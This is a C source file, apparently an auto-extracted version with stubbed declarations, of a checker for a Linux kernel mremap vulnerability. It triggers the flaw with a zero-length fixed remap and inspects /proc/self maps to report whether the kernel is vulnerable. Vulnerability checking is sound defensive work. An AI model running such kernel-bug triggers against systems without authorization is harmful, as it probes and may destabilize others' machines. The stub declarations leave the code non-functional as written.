
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int pid_t ;


 int MAPS_CHECK ;
 int MAPS_NO_CHECK ;
 int MAP_ANONYMOUS ;
 int MAP_PRIVATE ;
 int MREMAP_FIXED ;
 int MREMAP_MAYMOVE ;
 int O_RDONLY ;
 int PROT_READ ;
 int PROT_WRITE ;
 int VMASIZE ;
 int close (int) ;
 int fprintf (int ,char*,char*) ;
 int getpid () ;
 void* mmap (void*,int ,int,int,int ,int ) ;
 scalar_t__ mremap_check ;
 int open (char*,int ) ;
 int printf (char*,...) ;
 int read_maps (int,char*,int ) ;
 void* real_mremap (void*,int ,int ,int,void*) ;
 int sprintf (char*,char*,int) ;
 int stderr ;

int main(int argc, char **argv)
{
 void *base;
 char path[16];
 pid_t pid;
 int fd;

 pid = getpid();
 sprintf(path, "/proc/%d/maps", pid);

 if ( !(fd = open(path, O_RDONLY))) {
  fprintf(stderr, "Unable to open %s\n", path);
  return 1;
 }

 base = mmap((void *)0x60000000, VMASIZE, PROT_READ | PROT_WRITE,
      MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

 printf("\nBase address : 0x%x\n\n", base);
 read_maps(fd, path, MAPS_NO_CHECK);

 printf("\nRemapping at 0x70000000...\n\n");
 base = real_mremap(base, 0, 0, MREMAP_MAYMOVE | MREMAP_FIXED,
      (void *)0x70000000);

 read_maps(fd, path, MAPS_CHECK);

 printf("\nReport : \n");
 (mremap_check)
  ? printf("This kernel appears to be VULNERABLE\n\n")
  : printf("This kernel appears to be NOT VULNERABLE\n\n");

 close(fd);
 return 0;
}
